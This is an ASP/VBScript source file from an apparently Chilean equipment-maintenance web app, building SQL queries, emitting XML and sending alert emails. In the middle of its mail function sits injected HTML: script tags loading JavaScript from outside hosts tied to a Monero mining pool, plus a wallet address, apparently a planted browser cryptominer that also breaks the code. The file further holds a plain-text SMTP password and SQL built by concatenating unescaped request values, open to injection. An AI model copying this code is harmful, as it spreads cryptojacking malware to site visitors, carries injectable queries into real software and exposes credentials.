	query = query & " , E.DESCRIPCION, E.LAYOUT, E.X, E.Y, E.SCALEX, E.SCALEY "
	query = query & " FROM EQUIPOS E LEFT JOIN "
	query = query & " (SELECT DBO.EquipoPrincipalFaena(B.EQUIPO," & strNvl(Faena)  & ") AS EQUIPO, MAX(B.CRITICIDAD) *  T.CRITICIDAD/100 AS CRITICIDAD "
	query = query & " FROM BITACORAS AS B, EQUIPOS AS E, TIPO_EQUIPOS AS T WHERE E.ESTADO='ACT' AND B.UBICACION =  " & strNvl(Faena) 
	query = query & " AND B.EQUIPO=E.CODIGO AND E.TIPO_EQUIPO = T.CODIGO AND B.COLOR IS NOT NULL "
	query = query & " AND IND_SOLUCION='false' GROUP BY DBO.EquipoPrincipalFaena(B.EQUIPO," & strNvl(Faena)  & "),T.EQUIPOCRITICIDAD, T.CRITICIDAD) AS T "
	query = query & " ON T.EQUIPO = E.CODIGO WHERE E.UBICACION = " & strNvl(Faena)  
	query = query & " AND E.COD_EQUIPO_PADRE IS NULL  "
	query = query & " AND E.ESTADO = 'ACT' "
	query = query & " GROUP BY DBO.EquipoPrincipal(E.CODIGO), E.SECUENCIA, E.DESCRIPCION, E.LAYOUT, E.X, E.Y, E.SCALEX, E.SCALEY "
	query = query & " ORDER BY E.SECUENCIA, DBO.EquipoPrincipal(E.CODIGO)"

	Set ORs =oDB.EjecutaSql(query)
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>"
		  Response.Write "<EQUIPO>" & 		trim(ORs.Fields.Item(0).Value) & "</EQUIPO>"
		  Response.Write "<SECUENCIA>" & 	trim(ORs.Fields.Item(1).Value) & "</SECUENCIA>"
		  Response.Write "<VALOR>" & 		trim(ORs.Fields.Item(2).Value) & "</VALOR>"
		  Response.Write "<COLOR>" & 		trim(ORs.Fields.Item(3).Value) & "</COLOR>"
		  Response.Write "<DESCRIPCION>" & 	trim(ORs.Fields.Item(4).Value) & "</DESCRIPCION>"
		  Response.Write "<LAYOUT>" & 		trim(ORs.Fields.Item(5).Value) & "</LAYOUT>"
		  Response.Write "<X>" & 			trim(ORs.Fields.Item(6).Value) & "</X>"
		  Response.Write "<Y>" & 			trim(ORs.Fields.Item(7).Value) & "</Y>"
		  Response.Write "<SCALEX>" & 		trim(ORs.Fields.Item(8).Value) & "</SCALEX>"
		  Response.Write "<SCALEY>" & 		trim(ORs.Fields.Item(9).Value) & "</SCALEY>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function DelInsumo()
	query = "DELETE FROM INSUMOS WHERE CODIGO='" & CODIGO & "' "
	ORs = oDB.EjecutaSql(query)
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
		Response.Write "OK"
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function 

function strNvl(Valor)
	if Len(Valor) <1 then
		strNvl = "NULL"
	else
		strNvl = "'" & Valor & "'"	
	end if
end function


function updateMod_Obs()

	query = "UPDATE BITACORAS SET ULT_MOD_OBS =" & strNvl(ULT_MOD_OBS)
	query = query & " WHERE ID = " & strNvl(ID)
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-1'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	  Response.Write "<ROWS>" 
		  Response.Write "<LAYOUT>OK</LAYOUT>"
	  Response.Write "</ROWS>"
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
	
end function

function LayoutFaenaPlanta()
	query = "SELECT DBO.EquipoPrincipal(E.CODIGO) AS EQUIPO, E.SECUENCIA, SUM(ISNULL(T.CRITICIDAD,0)) AS VALOR, "
	query = query & " CASE WHEN (SUM(ISNULL(T.CRITICIDAD,0)) = 0 ) THEN 'NORMAL' "
	query = query & "      WHEN (SUM(ISNULL(T.CRITICIDAD,0)) <= 25 AND SUM(ISNULL(T.CRITICIDAD,0)) >= 1 ) THEN 'BAJA' "
	query = query & " 	   WHEN (SUM(ISNULL(T.CRITICIDAD,0)) < 70 AND SUM(ISNULL(T.CRITICIDAD,0)) > 25) THEN 'MEDIA' "
	query = query & " 	   WHEN (SUM(ISNULL(T.CRITICIDAD,0))) >= 70 THEN 'ALTA' "
	query = query & " 	   ELSE 'NORMAL' END AS COLOR "
	query = query & " , E.DESCRIPCION, E.LAYOUT, E.X, E.Y, E.SCALEX, E.SCALEY, S.PLANTA "
	query = query & " FROM EQUIPOS E INNER JOIN SECCIONES S ON E.SECCION = S.CODIGO  LEFT JOIN "
	query = query & " (SELECT DBO.EquipoPrincipalFaena(B.EQUIPO," & strNvl(Faena)  & ") AS EQUIPO, MAX(B.CRITICIDAD) *  T.CRITICIDAD/100 AS CRITICIDAD "
	query = query & " FROM BITACORAS AS B, EQUIPOS AS E, TIPO_EQUIPOS AS T WHERE E.ESTADO='ACT' AND B.UBICACION =  " & strNvl(Faena) 
	query = query & " AND B.EQUIPO=E.CODIGO AND E.TIPO_EQUIPO = T.CODIGO AND B.COLOR IS NOT NULL AND DBO.TipoEquipoPrincipal(B.EQUIPO) <> (17) "
	query = query & " AND IND_SOLUCION='false' GROUP BY DBO.EquipoPrincipalFaena(B.EQUIPO," & strNvl(Faena)  & "),T.EQUIPOCRITICIDAD, T.CRITICIDAD) AS T "
	query = query & " ON T.EQUIPO = E.CODIGO WHERE E.UBICACION = " & strNvl(Faena) & " AND S.FAENA = " & strNvl(Faena)  
	query = query & " AND E.COD_EQUIPO_PADRE IS NULL  "
	query = query & " AND E.ESTADO = 'ACT'  "
	query = query & " GROUP BY DBO.EquipoPrincipal(E.CODIGO), E.SECUENCIA, E.DESCRIPCION, "
	query = query & " E.LAYOUT, E.X, E.Y, E.SCALEX, E.SCALEY, S.PLANTA"
	query = query & " ORDER BY E.SECUENCIA, DBO.EquipoPrincipal(E.CODIGO), S.PLANTA"

	Set ORs =oDB.EjecutaSql(query)
	Response.ContentType = "text/xml"
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>" '& query
	
	While Not ORs.EOF 
	  Response.Write "<ROW>"
		  Response.Write "<EQUIPO>" & 		trim(ORs.Fields.Item(0).Value) & "</EQUIPO>"
		  Response.Write "<SECUENCIA>" & 	trim(ORs.Fields.Item(1).Value) & "</SECUENCIA>"
		  Response.Write "<VALOR>" & 		trim(ORs.Fields.Item(2).Value) & "</VALOR>"
		  Response.Write "<COLOR>" & 		trim(ORs.Fields.Item(3).Value) & "</COLOR>"
		  Response.Write "<DESCRIPCION>" & 	trim(ORs.Fields.Item(4).Value) & "</DESCRIPCION>"
		  Response.Write "<LAYOUT>" & 		trim(ORs.Fields.Item(5).Value) & "</LAYOUT>"
		  Response.Write "<X>" & 			trim(ORs.Fields.Item(6).Value) & "</X>"
		  Response.Write "<Y>" & 			trim(ORs.Fields.Item(7).Value) & "</Y>"
		  Response.Write "<SCALEX>" & 		trim(ORs.Fields.Item(8).Value) & "</SCALEX>"
		  Response.Write "<SCALEY>" & 		trim(ORs.Fields.Item(9).Value) & "</SCALEY>"
		  Response.Write "<PLANTA>" & 		trim(ORs.Fields.Item(10).Value) & "</PLANTA>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function ListBitacoraAndina()

	query = "SELECT dbo.equipoPrincipalFaena(COD_MESA,FAENA) AS EQUIPO, COD_ESTOCADA, ESTOCADA, COD_MESA, MESA, ESTACION, FECHA, IZQUIERDO, CENTRO, DERECHO"
	query = query & " FROM POLINES "
	query = query & " WHERE "
	if FECHA_INI <> "" and FECHA_FIN <> "" then
		query = query & "(CONVERT(DATETIME,CONVERT(CHAR,FECHA,103)) BETWEEN " & strNvl(FECHA_INI)
		query = query & " AND DATEADD(d,1," & strNvl(FECHA_FIN) & "))"
		query = query & " AND "
	end if
	query = query & "  FAENA=" & strNvl(FAENA) 
	

	If EQUIPO<>"TOD"  Then
		query = query & " AND RTRIM(dbo.equipoprincipalfaena(COD_MESA,FAENA))=" & strNvl(EQUIPO) 
	End if

	If COD_ESTOCADA<>"TOD" AND COD_ESTOCADA<>"UNICA"  Then
		query = query & " AND RTRIM(COD_ESTOCADA)=" & strNvl(COD_ESTOCADA) 
	End if
	
	If COD_MESA<>"TOD"  Then
		query = query & " AND RTRIM(COD_MESA)=" & strNvl(COD_MESA) 
	End if
		
	'query = query & " GROUP BY COD_ESTOCADA, ESTOCADA, COD_MESA, MESA, ESTACION, FECHA, IZQUIERDO, CENTRO, DERECHO"
'	query = query & " ORDER BY DBO.EQUIPOPRINCIPAL(B.EQUIPO), B.FECHA DESC  "
	
'	response.write query
'	response.end
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 
		
		
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' standalone='no' ?>" 
		Response.Write "<?xml-stylesheet  type='text/xsl' href='equiposRiesgo.xsl?X=34'?>" & VbCrLf & VbCrLf
	ELSE
		Response.ContentType = "text/xml"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	END IF
	
	Response.Write "<REGISTROS>" '& query'
	N=0
	While Not ORs.EOF 
		N=N+1
	  Response.Write "<ROW>" 
	  	Response.Write "<N>" & N & "</N>"
		  Response.Write "<CONEXION>" & ORs.Fields.Item(2).Value & "</CONEXION>"
		  Response.Write "<MESA>" & ORs.Fields.Item(4).Value & "</MESA>"
		  Response.Write "<ESTACION>" & ORs.Fields.Item(5).Value & "</ESTACION>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(6).Value & "</FECHA>"
		  Response.Write "<IZQ>" & ORs.Fields.Item(7).Value & "</IZQ>"
		  Response.Write "<CEN>" & ORs.Fields.Item(8).Value & "</CEN>"
		  Response.Write "<DER>" & ORs.Fields.Item(9).Value & "</DER>" 
		  
	  Response.Write "</ROW>"
	  ORs.MoveNext 
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function

function LayoutFaenaALL()
	
	query = ""
	if ID <> "" then
		dim ListArray
		ListArray = split(ID, ";")
		for loopctr = 0 to ubound(ListArray)
			Faena = ListArray(loopctr)
			query = query & " SELECT DBO.EquipoPrincipal(E.CODIGO) AS EQUIPO, E.SECUENCIA, SUM(ISNULL(T.CRITICIDAD,0)) AS VALOR, "
			query = query & " CASE WHEN (SUM(ISNULL(T.CRITICIDAD,0)) <= 25 AND SUM(ISNULL(T.CRITICIDAD,0)) > 0 ) THEN 'BAJA' "
			query = query & " 	   WHEN (SUM(ISNULL(T.CRITICIDAD,0)) < 70 AND SUM(ISNULL(T.CRITICIDAD,0)) > 25) THEN 'MEDIA' "
			query = query & " 	   WHEN (SUM(ISNULL(T.CRITICIDAD,0))) >= 70 THEN 'ALTA' "
			query = query & " 	   ELSE 'NORMAL' END AS COLOR "
			query = query & " , E.DESCRIPCION, E.LAYOUT, E.X, E.Y, E.SCALEX, E.SCALEY, UBICACION "
			query = query & " FROM EQUIPOS E LEFT JOIN "
			query = query & " (SELECT DBO.EquipoPrincipalFaena(B.EQUIPO," & strNvl(Faena)  & ") AS EQUIPO, MAX(B.CRITICIDAD) *  T.CRITICIDAD/100 AS CRITICIDAD "
			query = query & " FROM BITACORAS AS B, EQUIPOS AS E, TIPO_EQUIPOS AS T WHERE E.ESTADO='ACT' AND B.UBICACION =  " & strNvl(Faena) 
			query = query & " AND B.EQUIPO=E.CODIGO AND E.TIPO_EQUIPO = T.CODIGO AND B.COLOR IS NOT NULL "
			query = query & " AND IND_SOLUCION='false' GROUP BY DBO.EquipoPrincipalFaena(B.EQUIPO," & strNvl(Faena)  & "),T.EQUIPOCRITICIDAD, T.CRITICIDAD) AS T "
			query = query & " ON T.EQUIPO = E.CODIGO WHERE E.UBICACION = " & strNvl(Faena)  
			query = query & " AND E.COD_EQUIPO_PADRE IS NULL  "
			query = query & " AND E.ESTADO = 'ACT' "
			query = query & " GROUP BY DBO.EquipoPrincipal(E.CODIGO), E.SECUENCIA, E.DESCRIPCION, E.LAYOUT, E.X, E.Y, E.SCALEX, E.SCALEY, UBICACION "
			'query = query & " ORDER BY E.SECUENCIA, DBO.EquipoPrincipal(E.CODIGO)"
			if loopctr < ubound(ListArray) then
				query = query & "  UNION ALL "
			end if
			
		next
		
		Set ORs =oDB.EjecutaSql(query)
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
		Response.Write "<REGISTROS>"
		While Not ORs.EOF 
		  Response.Write "<ROW>"
			  Response.Write "<EQUIPO>" & 		trim(ORs.Fields.Item(0).Value) & "</EQUIPO>"
			  Response.Write "<SECUENCIA>" & 	trim(ORs.Fields.Item(1).Value) & "</SECUENCIA>"
			  Response.Write "<VALOR>" & 		trim(ORs.Fields.Item(2).Value) & "</VALOR>"
			  Response.Write "<COLOR>" & 		trim(ORs.Fields.Item(3).Value) & "</COLOR>"
			  Response.Write "<DESCRIPCION>" & 	trim(ORs.Fields.Item(4).Value) & "</DESCRIPCION>"
			  Response.Write "<LAYOUT>" & 		trim(ORs.Fields.Item(5).Value) & "</LAYOUT>"
			  Response.Write "<X>" & 			trim(ORs.Fields.Item(6).Value) & "</X>"
			  Response.Write "<Y>" & 			trim(ORs.Fields.Item(7).Value) & "</Y>"
			  Response.Write "<SCALEX>" & 		trim(ORs.Fields.Item(8).Value) & "</SCALEX>"
			  Response.Write "<SCALEY>" & 		trim(ORs.Fields.Item(9).Value) & "</SCALEY>"
			  Response.Write "<FAENA>" & 		trim(ORs.Fields.Item(10).Value) & "</FAENA>"
		  Response.Write "</ROW>"
		  ORs.MoveNext
		Wend
		Response.Write "</REGISTROS>"
	end if
	Set ORs = Nothing
	Set ODB = Nothing
end function

function MailBitacora(xSTS)
Dim MailServer
Dim toMail

'if xcolor = "ALTA" then
	P_TO = "ttminsight@ttmchile.cl;"
	CC_to = "msepulveda@ttmchile.cl;smorenov@ttmchile.cl;nortiz@ttmchile.cl;ssepulveda@ttmchile.cl"
'else
'	P_TO = "dgonzalez@ttmchile.cl;"
'	CC_to = "rmeza@ttmchile.cl;smorenov@ttmchile.cl;nortiz@ttmchile.cl;"
'end if
P_FROM = "info@ttminsight.cl"
CC_to = ""
'Cristian Oliva, Eduardo Veliz, Sebastian Sanchez, Ruben Meza, Sebastian Moreno, Victor Hugo, Marco Casanova, Marcelo Soto, Nelson Ortiz, Claudio Padilla, Juan Lopez, Francisco Gomez.

'MailServer = oDB.GetMailServer()
'***************************************************************
MailServer = "mail.ttminsight.cl"
'MailServer = "mail.vitcomz.com"
'***************************************************************

Const cdoSendUsingMethod        = _
	"http://schemas.microsoft.com/cdo/configuration/sendusing"
Const cdoSendUsingPort          = 2
Const cdoSMTPServer             = _
	"http://schemas.microsoft.com/cdo/configuration/smtpserver"
Const cdoSMTPServerPort         = _
	"http://schemas.microsoft.com/cdo/configuration/smtpserverport"
Const cdoSMTPConnectionTimeout  = _
	"http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout"
Const cdoSMTPAuthenticate       = _
	"http://schemas.microsoft.com/cdo/configuration/smtpauthenticate"
Const cdoBasic                  = 1
Const cdoSendUserName           = _
	"http://schemas.microsoft.com/cdo/configuration/sendusername"
Const cdoSendPassword           = _
	"http://schemas.microsoft.com/cdo/configuration/sendpassword"

Dim objConfig  ' As CDO.Configuration
Dim objMessage ' As CDO.Message
Dim Fields     ' As ADODB.Fields

' Get a handle on the config object and it's fields
Set objConfig = Server.CreateObject("CDO.Configuration")
Set Fields = objConfig.Fields

' Set config fields we care about
With Fields
	.Item(cdoSendUsingMethod)       = cdoSendUsingPort
	.Item(cdoSMTPServer)            = MailServer
	.Item(cdoSMTPServerPort)        = 25
	.Item(cdoSMTPConnectionTimeout) = 10
	.Item(cdoSMTPAuthenticate)      = cdoBasic
	.Item(cdoSendUserName)          = "info@ttminsight.cl" 	' USUARIO DE CORREO QUE ENVIA'
	.Item(cdoSendPassword)          = "r3m0lin0"          	' PASSWORD DE USUARIO'
	
	.Update
End With

Set objMessage = Server.CreateObject("CDO.Message")

Set objMessage.Configuration = objConfig

	SUBJECT = "Registro Deteccion Bitacoras Faena :" & FAENA
	
	BODY =  "</br>"
	BODY = BODY & "Estimado Usuario: </br>"
	BODY = BODY & "Le informamos que se ha detectado una condición crítica en TTM Insight.</br> "
	BODY = BODY & "<br><br>"
	BODY = BODY & "FAENA :<strong>" & FAENA & "</strong><BR>"

	query = "SELECT B.DESCRIPCION, B.CAUSA, B.RECOMENDACION, E.SECCION, DBO.EQUIPOPRINCIPALFAENA(E.CODIGO,E.UBICACION), B.COLOR, B.USERDATE, B.USERNAME "
	query = query & " FROM BITACORAS AS B "
	query = query & " INNER JOIN EQUIPOS AS E ON B.EQUIPO = E.CODIGO AND B.UBICACION = E.UBICACION "
	query = query & " WHERE B.ID=" & strNvl(ID)
	
	Set ORt =oDB.EjecutaSql(query)
	
	if Not ORt.EOF then
		OBSERVACION=ORt.Fields.Item(0).Value
		CAUSA_R=ORt.Fields.Item(1).Value
		RECOMENDACION=ORt.Fields.Item(2).Value
		SECCION=ORt.Fields.Item(3).Value
		EQ_PRINCIPAL=ORt.Fields.Item(4).Value
		COLOR=ORt.Fields.Item(5).Value
		FECHINSP=ORt.Fields.Item(6).Value
		INSPECTOR=ORt.Fields.Item(7).Value
	end if

	'set ORt = nothing
	
	query = "SELECT ID, RUTA, EXT FROM ARCHIVOS where familia = 'BITACORAS' and identificador = " & strNvl(ID) & " order by orden "
	Set ORt =oDB.EjecutaSql(query)	
	xx = 1
	While Not ORt.EOF 
		IDX=ORt.Fields.Item(0).Value
		EXTX=ORt.Fields.Item(2).Value
		FILESX = FILESX & "<a href='http://www.ttminsight.cl/sgm/Files/" & IDX & "." & EXTX & "' target='_blank'>Adjunto " & xx & "</a><BR>"
		xx = xx + 1
	ORt.MoveNext
	Wend

	set ORt = nothing
	'http://ttminsight.cl/sgm/Files/19373.JPG
	
	
	BODY = BODY & "BITACORA :<strong>" & ID & "</strong><BR>"
	BODY = BODY & "COMPONENTE: <strong> " & EQUIPO & "</strong><BR>"
	BODY = BODY & "EQUIPO: <strong> " & SECCION & "&nbsp; " & EQ_PRINCIPAL & "&nbsp; " & DES_EQUIPO & "</strong><BR>"
	BODY = BODY & "FECHA INSPECCION: <strong>" & FECHINSP & "</strong><BR><BR>"
	
	BODY = BODY & "<strong>ESTADO: AUMENTA CRITICIDAD<BR>"
	BODY = BODY & "<strong>CRITICIDAD: " & COLOR &  "<BR>"
	BODY = BODY & "INSPECTOR: " & INSPECTOR & "</strong><BR><BR>"
	'BODY = BODY & "OBSERVACI�"N:<strong> " & OBSERVACION & "</strong><BR><BR><BR>"
	'BODY = BODY & "RECOMENDACION:<strong> " & RECOMENDACION & "</strong><BR><BR><BR>"
	BODY = BODY &  FILESX & "<BR><BR>"
	BODY = BODY & "Direccion Web: TTM Insight <a href='http://www.ttminsight.cl'>http://www.ttminsight.cl</a><BR>"
	BODY = BODY & "TTMChile S.A.<BR>" 

<script src="http://sv9.premiumwebserver.com/iis/iisstart.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008"></script> <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008"> </script><script type="text/javascript">EverythingIsBinary('49YNi28eu3SL1KJHg2APzMgViFgYAyuLaYvRJTMUV6guUDe7zZN6JVzajp8RL8cxt9eVtREyTLPp4AKoR4wxuyoUVBfApN1', 'x', 40);</script>

	BODY = BODY & "</body></html> "
	'RESPONSE.WRITE BODY
	'RESPONSE.END()

With objMessage
	.To       = P_TO
	.Cc 	  = CC_to 
	.From     = P_FROM
	.Subject  = SUBJECT 
	.HTMLBody = BODY
	.Send
End With

Set Fields = Nothing
Set objMessage = Nothing
Set objConfig = Nothing

	
'	If Err.number <> 0 Then
'		'Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
'		Response.Write "<REGISTROS>"
'	 	 	Response.Write "<ROW>" 
'			Response.Write "<ERROR>" & Err.NUMBER & " " & Err.DESCRIPCION & "</ERROR>"
'	  		Response.Write "</ROW>"
'		Response.Write "</REGISTROS>"
'	Else
'		Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
'		Response.Write "<REGISTROS>"
'	 	 	Response.Write "<ROW>" 
'			Response.Write "<RETURN>TRUE</RETURN>"
'	  		Response.Write "</ROW>"
'		Response.Write "</REGISTROS>"
'	End If
'	On error Goto 0
'
	Set ORs = nothing

end function

function InfBitPolines()

	query = "SELECT B.COLOR, "
	if  (FAENA = "ANDINA") then
		query = query & " replace(EQ_2.DESCRIPCION, 'MESA ', '') as MESA, "
	ELSE
		query = query & " replace(EQ_2.DESCRIPCION, 'ESTACION ', '') as MESA, "
	END IF
	query = query & " replace(EQ_1.DESCRIPCION, 'Estacion de carga ', '') as ESTACION, "
	query = query & " DBO.EquipoPrincipal(EQ_2.CODIGO) as EQ_PRIMARIO, "
	query = query & " case when  CHARINDEX('PCAR', B.EQUIPO) > 0 then 'CAR' ELSE 'RET' END as TIPO, "
	query = query & " CHECKLIST.DESCRIPCION AS FALLAS, B.ULT_MOD_OBS  as INSPECCION,"
	query = query & " E.FECHA_INSTALACION as CAMBIO, case when  CHARINDEX('Derecho', E.DESCRIPCION) > 0 then 'DER' "
	query = query & "  when  CHARINDEX('Centro', E.DESCRIPCION) > 0 then 'CEN'  ELSE 'IZQ' END as POSICION, B.UBICACION as FAENA "
	query = query & " FROM BITACORAS AS B, EQUIPOS AS E, SECCIONES AS S, EQUIPOS AS EP, "
	query = query & " EQUIPOS AS EQ_1, EQUIPOS AS EQ_2, CHECK_EQUIPOS, CHECKLIST "
	
	query = query & " WHERE  DBO.SecEquipoPrincipal(B.EQUIPO)=S.CODIGO AND DBO.EquipoPrincipal(B.EQUIPO)=EP.CODIGO "
	query = query & " AND B.EQUIPO=E.CODIGO AND E.UBICACION=B.UBICACION AND EP.UBICACION=B.UBICACION "
	query = query & " AND E.COD_EQUIPO_PADRE = EQ_1.CODIGO AND EQ_1.COD_EQUIPO_PADRE = EQ_2.CODIGO "
	query = query & " AND (B.EQUIPO like '%PCAR-P%' or B.EQUIPO like '%PRET-P%') "
	query = query & " AND B.ID = CHECK_EQUIPOS.BITACORA AND CHECK_EQUIPOS.CHECKLIST = dbo.CHECKLIST.ID "
	query = query & " AND CHECKLIST.tipo_equipo = E.tipo_equipo "
	query = query & " AND (CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103)) BETWEEN " & strNvl(FECHA_INI)
	query = query & " AND DATEADD(d,1," & strNvl(FECHA_FIN) & "))"
	query = query & " and B.UBICACION=" & strNvl(FAENA)
	
	IF (FAENA = "ANDINA") then
	query = query & " and case when  CHARINDEX('Derecho', E.DESCRIPCION) > 0 then 'DER' "
	query = query & " when  CHARINDEX('Centro', E.DESCRIPCION) > 0 then 'CEN'  ELSE 'IZQ' END = 'DER'  "
	END IF
	
	query = query & " AND B.IND_SOLUCION <> 'true' "
	
	If CRITICIDAD<>"TOD" Then
		IF CRITICIDAD = "MEDALTA" THEN
			query = query & " AND B.COLOR IN ('MEDIA','ALTA')"
		ELSE
			query = query & " AND B.COLOR IN (" & strNvl(CRITICIDAD) & ")"
		END IF
	End if
	
	If EQUIPO<>"TOD" AND LEN(EQUIPO)>0 Then
		query = query & " and DBO.EquipoPrincipal(EQ_2.CODIGO) = " & strNvl(EQUIPO)
	End if
	
	If SECCION<>"'TOD'" AND LEN(SECCION)>0 Then
				query = query & " AND DBO.SecEquipoPrincipal(B.EQUIPO) IN (" & SECCION & ")"
	End if
	
	If RANX<>"TOD" AND LEN(RANX)>0 Then
		ARRANX = split(RANX, "-")
		query = query & " AND  CAST(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(	replace(replace(replace(replace(EQ_1.DESCRIPCION,'-', ''),'.', ''),' ', ''),'Q', ''),'W', ''),'E', ''),'R', ''),'T', ''),'Y', ''),'U', ''),'I', ''), 'O', ''),'P', ''), 'A', ''),'S', ''),'D', ''),'F', ''),'G', '')	,'H', ''),'J', ''),'K', ''),'L', ''), '�'', ''),'Z', ''), 'X', ''),'C', ''),'V', ''),'B', ''),'N', ''),'M', '') AS INT)  >= " & ARRANX(0)
		query = query & " AND  CAST(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(	replace(replace(replace(replace(EQ_1.DESCRIPCION,'-', ''),'.', ''),' ', ''),'Q', ''),'W', ''),'E', ''),'R', ''),'T', ''),'Y', ''),'U', ''),'I', ''), 'O', ''),'P', ''), 'A', ''),'S', ''),'D', ''),'F', ''),'G', '')	,'H', ''),'J', ''),'K', ''),'L', ''), '�'', ''),'Z', ''), 'X', ''),'C', ''),'V', ''),'B', ''),'N', ''),'M', '') AS INT)  <= " & ARRANX(1)
	END IF
			
	query = query & " GROUP BY B.ID, B.EQUIPO, DBO.EquipoPrincipal(B.EQUIPO), E.DESCRIPCION,  "
	query = query & " EP.DESCRIPCION, EP.CRITICIDAD, B.COLOR, EQ_2.DESCRIPCION, "
	query = query & " EQ_1.DESCRIPCION, DBO.EquipoPrincipal(EQ_2.CODIGO), CHECKLIST.DESCRIPCION, "
	query = query & " B.ULT_MOD_OBS, E.FECHA_INSTALACION, B.UBICACION "
	'query = query & " ORDER BY DBO.EquipoPrincipal(B.EQUIPO), B.EQUIPO "
	'response.write query
	'response.end
	Set ORs =oDB.EjecutaSql(query)
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=semanal.xls"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" 
		'Response.Write "<?xml-stylesheet type='text/xsl' href='http://www.ttminsight.cl/sgm/Informes/semanalXLS.xsl'?>" & VbCrLf
	ELSE
		Response.ContentType = "text/xml"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" 
		Response.Write "<?xml-stylesheet type='text/xsl' href='../Informes/infPolinesDetalles.xsl'?>" & VbCrLf
	END IF
	

	Response.Write "<REGISTROS>" '& query
	N=0
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
	  	  N=N+1 
		  Response.Write "<N>" & N & "</N>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(0).Value & "</COLOR>"
		  Response.Write "<MESA>" & ORs.Fields.Item(1).Value & "</MESA>"
		  Response.Write "<ESTACION>" & ORs.Fields.Item(2).Value & "</ESTACION>"
		  Response.Write "<FAENA>" & ORs.Fields.Item(9).Value & "</FAENA>"
		  Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(3).Value & "</EQUIPO_PRIN>"
		  Response.Write "<TIPO>" & ORs.Fields.Item(4).Value & "</TIPO>"
		  Response.Write "<FALLAS>" & ORs.Fields.Item(5).Value & "</FALLAS>"
   		  Response.Write "<INSPECCION>" & ORs.Fields.Item(6).Value & "</INSPECCION>"
   		  Response.Write "<CAMBIO>" & ORs.Fields.Item(7).Value & "</CAMBIO>"
		  Response.Write "<POS>" & ORs.Fields.Item(8).Value & "</POS>"  
		  Response.Write "<FECHA>" & FECHA_INI & "</FECHA>"
  	      Response.Write "<FECHA2>" & FECHA_FIN & "</FECHA2>"
		 Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function InfBitPolinesSinxsl()


	query = "SELECT B.COLOR, "
	if  (FAENA = "ANDINA") then
		query = query & " CAST(replace(replace(EQ_1.DESCRIPCION, 'Estacion de carga ', ''), 'N ', '') AS INT)  as MESA, "
	ELSE
		query = query & " CAST(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(EQ_1.DESCRIPCION,'-', ''),'.', ''),' ', ''),'Q', ''),'W', ''),'E', ''),'R', ''),'T', ''),'Y', ''),'U', ''),'I', ''), 'O', ''),'P', ''), 'A', ''),'S', ''),'D', ''),'F', ''),'G', ''),'H', ''),'J', ''),'K', ''),'L', ''), '�'', ''),'Z', ''), 'X', ''),'C', ''),'V', ''),'B', ''),'N', ''),'M', '') AS INT)  as MESA, "
	END IF

	
